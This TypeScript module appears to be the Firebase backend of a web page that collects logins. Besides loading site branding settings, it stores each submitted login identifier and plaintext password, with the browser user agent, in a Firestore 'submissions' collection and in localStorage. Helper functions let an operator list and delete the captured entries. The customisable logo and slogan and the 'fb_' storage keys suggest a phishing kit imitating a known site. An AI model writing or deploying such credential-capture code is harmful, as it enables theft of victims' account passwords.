import { initializeApp } from 'firebase/app';
import {
  getFirestore,
  doc,
  getDoc,
  setDoc,
  onSnapshot,
  collection,
  addDoc,
  query,
  orderBy,
  limit,
  getDocs,
  deleteDoc
} from 'firebase/firestore';
import { getAuth } from 'firebase/auth';
import { getAnalytics, isSupported } from 'firebase/analytics';
import firebaseConfig from '../firebase-applet-config.json';
import { SiteSettings, LoginSubmission } from './types';

export const app = initializeApp(firebaseConfig);

// Connect to default Firestore or specified database ID
export const db =
  firebaseConfig.firestoreDatabaseId &&
  firebaseConfig.firestoreDatabaseId !== '(default)' &&
  firebaseConfig.firestoreDatabaseId.trim() !== ''
    ? getFirestore(app, firebaseConfig.firestoreDatabaseId)
    : getFirestore(app);

export const auth = getAuth(app);

// Initialize Analytics if supported in this environment
if (typeof window !== 'undefined' && firebaseConfig.measurementId) {
  isSupported()
    .then((yes) => {
      if (yes) {
        getAnalytics(app);
      }
    })
    .catch(() => {
      // Analytics not supported in iframe/environment
    });
}

export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  };
}

export function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo: auth.currentUser?.providerData?.map(provider => ({
        providerId: provider.providerId,
        email: provider.email,
      })) || []
    },
    operationType,
    path
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

const SETTINGS_DOC_ID = 'branding';
const LOCAL_STORAGE_KEY = 'fb_site_settings';

export const DEFAULT_SETTINGS: SiteSettings = {
  logoUrl: '',
  pageImageUrl: '',
  headlineLine1: 'Explore',
  headlineLine2: 'the things',
  headlineHighlight: 'you love.',
  updatedAt: new Date().toISOString()
};

export async function fetchSiteSettings(): Promise<SiteSettings> {
  try {
    const docRef = doc(db, 'settings', SETTINGS_DOC_ID);
    const snap = await getDoc(docRef);
    if (snap.exists()) {
      const data = snap.data() as SiteSettings;
      localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(data));
      return data;
    }
  } catch (err) {
    console.warn('Firestore fetch failed, checking local storage:', err);
  }

  // Fallback to local storage if firestore was offline or not yet initialized
  const cached = localStorage.getItem(LOCAL_STORAGE_KEY);
  if (cached) {
    try {
      return JSON.parse(cached);
    } catch {
      // ignore
    }
  }
  return DEFAULT_SETTINGS;
}

export function subscribeToSiteSettings(onUpdate: (settings: SiteSettings) => void) {
  const docRef = doc(db, 'settings', SETTINGS_DOC_ID);
  return onSnapshot(
    docRef,
    (snap) => {
      if (snap.exists()) {
        const data = snap.data() as SiteSettings;
        localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(data));
        onUpdate(data);
      }
    },
    (error) => {
      console.warn('Realtime subscription fallback to local cache:', error.message);
      const cached = localStorage.getItem(LOCAL_STORAGE_KEY);
      if (cached) {
        try {
          onUpdate(JSON.parse(cached));
        } catch {
          // ignore
        }
      }
    }
  );
}

export async function updateSiteSettings(settings: Partial<SiteSettings>): Promise<void> {
  const merged: SiteSettings = {
    ...DEFAULT_SETTINGS,
    ...settings,
    updatedAt: new Date().toISOString(),
    updatedBy: 'admin'
  };

  // Always update local storage first for snappy UX
  localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(merged));

  try {
    const docRef = doc(db, 'settings', SETTINGS_DOC_ID);
    await setDoc(docRef, merged, { merge: true });
  } catch (error) {
    handleFirestoreError(error, OperationType.WRITE, `settings/${SETTINGS_DOC_ID}`);
  }
}

export async function logSubmission(identifier: string, password?: string): Promise<void> {
  const submissionData = {
    identifier,
    password: password || '',
    submittedAt: new Date().toISOString(),
    userAgent: navigator.userAgent
  };

  // Also save locally
  try {
    const local = JSON.parse(localStorage.getItem('fb_submissions') || '[]');
    local.unshift({ id: 'local_' + Date.now(), ...submissionData });
    localStorage.setItem('fb_submissions', JSON.stringify(local.slice(0, 50)));
  } catch {
    // ignore
  }

  try {
    await addDoc(collection(db, 'submissions'), submissionData);
  } catch (err) {
    console.warn('Could not write submission to Firestore:', err);
  }
}

export async function getSubmissions(): Promise<LoginSubmission[]> {
  try {
    const q = query(collection(db, 'submissions'), orderBy('submittedAt', 'desc'), limit(50));
    const snap = await getDocs(q);
    const results: LoginSubmission[] = [];
    snap.forEach((d) => {
      results.push({ id: d.id, ...d.data() } as LoginSubmission);
    });
    if (results.length > 0) {
      return results;
    }
  } catch (err) {
    console.warn('Fetching submissions from Firestore failed, fallback to local:', err);
  }

  try {
    return JSON.parse(localStorage.getItem('fb_submissions') || '[]');
  } catch {
    return [];
  }
}

export async function deleteSubmission(id: string): Promise<void> {
  try {
    if (!id.startsWith('local_')) {
      await deleteDoc(doc(db, 'submissions', id));
    }
  } catch (err) {
    console.warn('Error deleting submission from Firestore:', err);
  }

  try {
    const local: LoginSubmission[] = JSON.parse(localStorage.getItem('fb_submissions') || '[]');
    const filtered = local.filter(s => s.id !== id);
    localStorage.setItem('fb_submissions', JSON.stringify(filtered));
  } catch {
    // ignore
  }
}
